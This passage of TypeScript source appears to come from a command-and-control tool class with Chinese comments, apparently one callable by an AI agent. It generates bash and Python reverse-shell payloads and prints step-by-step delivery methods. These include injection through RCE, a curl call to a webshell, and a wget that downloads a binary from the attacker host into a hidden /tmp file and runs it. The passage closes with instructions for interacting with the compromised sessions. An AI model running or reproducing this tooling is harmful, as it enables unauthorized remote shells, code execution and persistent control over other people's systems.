    const payloadResult = await this.deployPayload({
      ...input,
      lhost,
      lport,
    }, context)
    results.push(payloadResult.content)
    results.push('')

    // 步骤3：提供投递指引
    const nativePayload = this.genNativePayload('reverse_shell', platform, 'bash', lhost, lport)
    const pythonPayload = this.genNativePayload('reverse_shell', platform, 'python', lhost, lport)

    results.push(`── 步骤3: 投递Payload到目标 ──`)
    results.push(``)
    results.push(`方式1 - 通过RCE直接注入（无文件落地，推荐）:`)
    results.push(`  ${nativePayload}`)
    results.push(``)
    results.push(`方式2 - Python反弹shell（更稳定）:`)
    results.push(`  ${pythonPayload}`)
    results.push(``)
    results.push(`方式3 - 通过webshell投递:`)
    results.push(`  curl "http://TARGET/ws.php" --data-urlencode "c=${nativePayload}"`)
    results.push(``)
    results.push(`方式4 - 下载并执行已生成的payload文件:`)
    results.push(`  wget http://${lhost}:8889/payload_${platform}_${lport}.bin -O /tmp/.u && chmod +x /tmp/.u && /tmp/.u &`)
    results.push('')
    results.push(`── 步骤4: 等待上线后交互 ──`)
    results.push(``)
    results.push(`  查看session: C2({ action: "list_sessions" })`)
    results.push(`  交互:        C2({ action: "interact_session", session_id: "msf_1", command: "getuid" })`)

    return { content: results.join('\n'), isError: false }
  }

  // ── 辅助方法 ────────────────────────────────────────────────────────────

  private findListenerTmuxSession(framework: string, port: number): string | undefined {
    for (const [, l] of this.listeners) {
      if (l.framework === framework && l.port === port && l.tmuxSession) {
        return l.tmuxSession
      }
    }
    return undefined
  }

  private shellEsc(s: string): string {
    return `'${s.replace(/'/g, "'\\''")}'`
  }

  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms))
  }
}
